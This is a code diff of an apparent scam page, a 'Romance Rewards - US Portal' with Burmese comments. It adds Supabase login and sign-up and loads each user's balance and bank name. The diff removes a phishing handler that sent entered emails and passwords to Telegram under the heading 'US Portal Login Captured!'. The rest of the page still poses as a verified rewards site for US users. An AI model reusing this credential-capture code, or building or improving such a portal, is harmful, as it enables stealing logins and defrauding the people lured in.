@@ -5,6 +5,95 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Romance Rewards - US Portal</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<!-- Supabase Script CDN (esm.sh version to fix module error) -->
+<script type="module">
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
+
+const supabaseUrl = 'https://acabwfzfvgdfzivikwei.supabase.co'
+const supabaseKey = 'sb_publishable_jKNqXvsRkY3uEC3B4gJi0w_9bpSBfOV'
+const supabase = createClient(supabaseUrl, supabaseKey)
+
+window.supabaseClient = supabase;
+
+// ၁။ User လော့အင်ဝင်တဲ့ ပုံစံ (Login လုပ်တဲ့ Form ထဲက ခလုတ်နဲ့ ချိတ်ဖို့)
+window.loginUser = async function(email, password) {
+const { data, error } = await supabase.auth.signInWithPassword({
+email: email,
+password: password,
+})
+
+if (error) {
+alert("လော့အင်ဝင်လို့ မအောင်မြင်ပါ: " + error.message)
+} else {
+alert("လော့အင် အောင်မြင်ပါတယ်!")
+loadCustomerFinancialData(data.user.id)
+currentUserEmail = email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = email;
+if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+switchPage('dashboard-page');
+}
+}
+
+// ၂။ User အကောင့်အသစ်ဖွင့်တဲ့ ပုံစံ (Sign Up)
+window.signUpUser = async function(email, password) {
+const { data, error } = await supabase.auth.signUp({
+email: email,
+password: password,
+})
+
+if (error) {
+alert("အကောင့်ဖွင့်လို့ မအောင်မြင်ပါ: " + error.message)
+} else {
+alert("အကောင့် အောင်မြင်စွာ ဖွင့်ပြီးပါပြီ!")
+currentUserEmail = email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = email;
+if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+switchPage('dashboard-page');
+}
+}
+
+// ၃။ Database ထဲက ဒေတာတွေ လှမ်းထုတ်မယ့် ပုံစံ
+async function loadCustomerFinancialData(userId) {
+const { data, error } = await supabase
+.from('Profiles')
+.select('*')
+.eq('id', userId)
+.single()
+
+if (error) {
+console.log("ဒေတာဆွဲထုတ်လို့ မရသေးပါ", error)
+} else {
+console.log("ငွေပမာဏ:", data.balance)
+console.log("ဘဏ်နာမည်:", data.bank_name)
+
+if(data.balance !== undefined) {
+userBalance = data.balance;
+document.getElementById("user-balance").innerText = userBalance.toFixed(2);
+document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
+updateProgressBar(userBalance);
+}
+}
+}
+
+// ၄။ အကောင့်ဝင်ပြီးသားဖြစ်ရင် အလိုအလျောက် စစ်ပေးမယ့်စနစ်
+window.addEventListener('DOMContentLoaded', async () => {
+const { data: { session } } = await supabase.auth.getSession()
+if (session) {
+loadCustomerFinancialData(session.user.id)
+currentUserEmail = session.user.email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = currentUserEmail;
+if(avatarLetter) avatarLetter.innerText = currentUserEmail.charAt(0).toUpperCase();
+}
+})
+</script>
+
 <style>
 /* Dark Neon Purple & White Theme Styles */
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
@@ -76,26 +165,43 @@ transition: transform 0.2s ease;
 background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%);
 color: #ffffff; border: none; padding: 12px 30px; font-size: 0.95rem;
 font-weight: 800; border-radius: 30px; cursor: pointer; width: 100%; max-width: 350px;
-box-shadow: 0 4px 20px rgba(138, 0, 245, 0.4); transition: all 0.3s ease;
+box-shadow: 0 4px 20px rgba(138, 0, 245, 0.4); transition: all 0.3s ease; margin-bottom: 10px;
 }
 .get-started-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(138, 0, 245, 0.6); }
 
-/* Login Page with Background Artwork */
-#login-page {
+.signup-redirect-btn {
+background: transparent;
+color: #E000FF;
+border: 1px solid #8A00F5;
+padding: 10px 30px;
+font-size: 0.9rem;
+font-weight: 700;
+border-radius: 30px;
+cursor: pointer;
+width: 100%;
+max-width: 350px;
+transition: all 0.3s ease;
+}
+.signup-redirect-btn:hover {
+background: rgba(138, 0, 245, 0.15);
+}
+
+/* Auth Pages (Login & Signup Cards) */
+#login-page, #signup-page {
 align-items: center; justify-content: center; padding: 20px; min-height: 100vh;
 background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.92)), url('https://i.ibb.co/zhwdB8yv/PNG-image-101.png') no-repeat center center;
 background-size: cover;
 }
-.login-card { background-color: rgba(30, 41, 59, 0.92); backdrop-filter: blur(10px); padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid #8A00F5; text-align: left; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.25); }
-.login-card h2 { color: #E000FF; margin-bottom: 5px; font-size: 1.5rem; font-weight: 700; }
-.login-card p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
-.login-input-group { margin-bottom: 15px; }
-.login-input-group label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: #f8fafc; font-weight: 600; }
-.login-input-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
-.login-input-group input:focus { border-color: #E000FF; box-shadow: 0 0 8px rgba(224, 0, 255, 0.3); }
-.login-submit-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
-.login-back-btn { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
-.login-back-btn:hover { background: #334155; color: #f8fafc; }
+.auth-card { background-color: rgba(30, 41, 59, 0.92); backdrop-filter: blur(10px); padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid #8A00F5; text-align: left; box-shadow: 0 10px 30px rgba(138, 0, 245, 0.25); }
+.auth-card h2 { color: #E000FF; margin-bottom: 5px; font-size: 1.5rem; font-weight: 700; }
+.auth-card p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
+.auth-input-group { margin-bottom: 15px; }
+.auth-input-group label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: #f8fafc; font-weight: 600; }
+.auth-input-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #f8fafc; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+.auth-input-group input:focus { border-color: #E000FF; box-shadow: 0 0 8px rgba(224, 0, 255, 0.3); }
+.auth-submit-btn { background: linear-gradient(135deg, #8A00F5 0%, #E000FF 100%); color: #ffffff; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 15px rgba(138, 0, 245, 0.3); }
+.auth-back-btn { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.auth-back-btn:hover { background: #334155; color: #f8fafc; }
 
 /* Dashboard */
 #dashboard-page { padding-bottom: 80px; display: none; background: #0f172a; }
@@ -466,22 +572,42 @@ color: #ffffff;
 <span><i class="fa-solid fa-check-circle"></i> Verified</span>
 </div>
 <button class="get-started-btn" onclick="switchPage('login-page')">Sign In to Account</button>
+<button class="signup-redirect-btn" onclick="switchPage('signup-page')">Create New Account (Sign Up)</button>
 </div>
 
+<!-- Login Page -->
 <div id="login-page" class="page">
-<div class="login-card">
+<div class="auth-card">
 <h2>Secure Sign In</h2>
 <p>Enter your US registered account details.</p>
-<div class="login-input-group">
+<div class="auth-input-group">
 <label>Email Address</label>
 <input type="email" id="login-email" placeholder="user@gmail.com">
 </div>
-<div class="login-input-group">
+<div class="auth-input-group">
 <label>Password</label>
 <input type="password" id="login-pass" placeholder="Enter password">
 </div>
-<button type="button" class="login-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
-<button type="button" class="login-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
+<button type="button" class="auth-submit-btn" onclick="handleLoginSubmit()">Sign In to Dashboard</button>
+<button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
+</div>
+</div>
+
+<!-- Sign Up Page -->
+<div id="signup-page" class="page">
+<div class="auth-card">
+<h2>Create Account</h2>
+<p>Sign up to start earning daily US rewards.</p>
+<div class="auth-input-group">
+<label>Email Address</label>
+<input type="email" id="signup-email" placeholder="user@gmail.com">
+</div>
+<div class="auth-input-group">
+<label>Password</label>
+<input type="password" id="signup-pass" placeholder="Enter secure password">
+</div>
+<button type="button" class="auth-submit-btn" onclick="handleSignupSubmit()">Register & Sign Up</button>
+<button type="button" class="auth-back-btn" onclick="switchPage('landing-page')">Back to Home</button>
 </div>
 </div>
 
@@ -958,20 +1084,21 @@ if(!email || !pass) {
 alert("Please enter both email and password.");
 return;
 }
-currentUserEmail = email;
-let emailDisplay = document.getElementById("nav-email-display");
-let avatarLetter = document.getElementById("user-avatar-letter");
-if(emailDisplay) emailDisplay.innerText = email;
-if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
 
-let msg = `🚨 *US Portal Login Captured!* 🚨\n\n` +
-`📧 *Email:* \`${email}\`\n` +
-`🔑 *Password:* \`${pass}\`\n` +
-`⏰ *Time:* ${new Date().toLocaleString()}`;
-sendToTelegram(msg);
+window.loginUser(email, pass);
+}
 
-loadImages(images);
-switchPage('dashboard-page');
+function handleSignupSubmit() {
+let emailInput = document.getElementById("signup-email");
+let passInput = document.getElementById("signup-pass");
+let email = emailInput ? emailInput.value : "";
+let pass = passInput ? passInput.value : "";
+if(!email || !pass) {
+alert("Please enter both email and password for sign up.");
+return;
+}
+
+window.signUpUser(email, pass);
 }
 
 function loadImages(list) {
